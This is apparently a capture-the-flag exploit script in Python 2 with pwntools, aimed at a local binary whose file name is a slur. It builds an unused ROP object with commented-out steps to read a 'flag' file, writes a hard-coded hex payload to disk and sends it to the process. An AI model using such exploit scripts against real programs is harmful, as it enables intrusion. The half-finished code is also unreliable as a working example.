#!/usr/bin/env python

from pwn import *

progName = "./faggin"

context.arch = "i386"
context.kernel = "amd64"
binary = elf.ELF(progName)

rop = rop.ROP(binary)

# rop.open("flag")

# rop.cat("flag")
print str(rop).encode('hex')


payload = "000000fd00000000000000000000000000000000ddccbbaa0000f10000af000000e0000020e88000eb007f".decode("hex")
with open("payload", 'w') as f:
	f.write(payload)

conn = process(progName)

conn.sendline(payload)

